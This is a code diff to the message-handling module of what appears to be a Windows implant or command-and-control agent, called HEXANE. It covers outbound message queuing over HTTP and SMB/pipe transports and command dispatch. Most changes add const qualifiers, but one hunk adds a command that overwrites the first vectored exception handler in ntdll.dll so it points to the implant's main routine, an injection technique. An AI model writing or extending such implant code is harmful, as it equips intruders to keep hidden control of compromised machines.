@@ -1,7 +1,7 @@
 #include <core/include/message.hpp>
 namespace Message {
 
-    BOOL PeekPID(_stream *stream) {
+    BOOL PeekPID(const _stream *const stream) {
         HEXANE
         UINT pid = 0;
 
@@ -13,7 +13,7 @@ namespace Message {
         return FALSE;
     }
 
-    VOID AddMessage(_stream *out) {
+    VOID AddMessage(_stream *const out) {
         HEXANE
 
         _stream *head = Ctx->Transport.OutboundQueue;
@@ -61,7 +61,7 @@ namespace Message {
         }
     }
 
-    VOID OutboundQueue(_stream *out) {
+    VOID OutboundQueue(const _stream *out) {
         HEXANE
 
         _parser parser = { };
@@ -95,7 +95,7 @@ namespace Message {
         defer:
     }
 
-    VOID QueueSegments(byte *buffer, uint32_t length) {
+    VOID QueueSegments(uint8_t *const buffer, uint32_t length) {
         HEXANE
 
         _stream *entry = { };
@@ -105,7 +105,8 @@ namespace Message {
         uint32_t task_id    = 0;
         uint32_t cb_seg     = 0;
         uint32_t index      = 1;
-        uint32_t n_seg      = (length + MESSAGE_MAX - 1) / MESSAGE_MAX;
+
+        const auto n_seg = (length + MESSAGE_MAX - 1) / MESSAGE_MAX;
 
         while (length > 0) {
             cb_seg = length > MESSAGE_MAX - SEGMENT_HEADER_SIZE
@@ -146,6 +147,7 @@ namespace Message {
         retry:
 
         if (!Ctx->Transport.OutboundQueue) {
+
 #ifdef TRANSPORT_SMB
             return_defer(ERROR_SUCCESS);
 #elifdef TRANSPORT_HTTP
@@ -154,6 +156,7 @@ namespace Message {
             OutboundQueue(entry);
             goto retry;
 #endif
+
         } else {
             head = Ctx->Transport.OutboundQueue;
             while (head) {
@@ -193,6 +196,7 @@ namespace Message {
 #ifdef TRANSPORT_PIPE
         Smb::PeerConnectEgress(out, &in);
 #endif
+
         Stream::DestroyStream(out);
         out = nullptr;
 
@@ -237,7 +241,7 @@ namespace Message {
         {.Id = 0,                   .Function = nullptr}
     };
 
-    VOID CommandDispatch (_stream *in) {
+    VOID CommandDispatch (const _stream *const in) {
         HEXANE
 
         _parser parser = { };
@@ -296,6 +300,17 @@ namespace Message {
                 if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtFreeVirtualMemory(NtCurrentProcess(), &exec, &size, MEM_FREE))) {
                     return_defer(ntstatus);
                 }
+            }
+
+        case TypeVeh: {
+                constexpr Injection::Veh::_veh_writer writer {
+                    .mask = "xxx00xxx",
+                    .signature = "\x00\x00\x00\x00\x00\x00\x00\x00",
+                    .mod_name = L"ntdll.dll",
+                    .target = Implant::MainRoutine
+                };
+
+                OverwriteFirstHandler(writer);
             }
 
             default:
